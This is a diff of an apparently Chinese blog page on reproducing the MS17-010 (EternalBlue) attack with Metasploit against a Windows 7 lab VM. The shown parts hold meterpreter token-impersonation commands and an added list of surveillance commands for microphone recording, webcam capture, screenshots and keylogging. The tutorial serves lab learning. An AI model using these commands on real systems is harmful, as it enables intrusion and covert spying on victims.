@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/3.png">
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/4.png">
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/5.png">
-<meta property="og:updated_time" content="2018-09-10T05:06:46.022Z">
+<meta property="og:updated_time" content="2018-09-10T11:24:13.117Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf中使用ms17010">
 <meta name="twitter:description" content="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现实验环境：  kali攻击机 192.168.59.128  win7靶机 192.168.59.129">
@@ -206,6 +206,23 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito <span class="comment">#加载incognito功能</span></span><br><span class="line">meterpreter &gt; list_tokens -u <span class="comment">#列出可用令牌</span></span><br><span class="line">meterpreter &gt; impersonate_token WIN-6LMKOEQAO5E\\r1ngs <span class="comment">#伪造令牌</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2018/09/09/essay-ms17010/5.png" alt=""></p>
 <p>虽然使用reboot依然提示<code>Access is denied</code>但是使用shell已经可使用<code>shutdown</code>命令关机了</p>
+<p>一些骚命令：</p>
+<ul>
+<li><p>record_mic 记录音频</p>
+</li>
+<li><p>webcam_list 检查是否有摄像头</p>
+</li>
+<li><p>webcam_snap 拍张照</p>
+</li>
+<li><p>webcam_stream 打开摄像头，实况直播</p>
+</li>
+<li><p>screenshot 截图</p>
+</li>
+<li><p>keyscan_start 键盘记录开始</p>
+</li>
+<li><p>keyscan_dump 导出记录</p>
+</li>
+</ul>
 
       
 
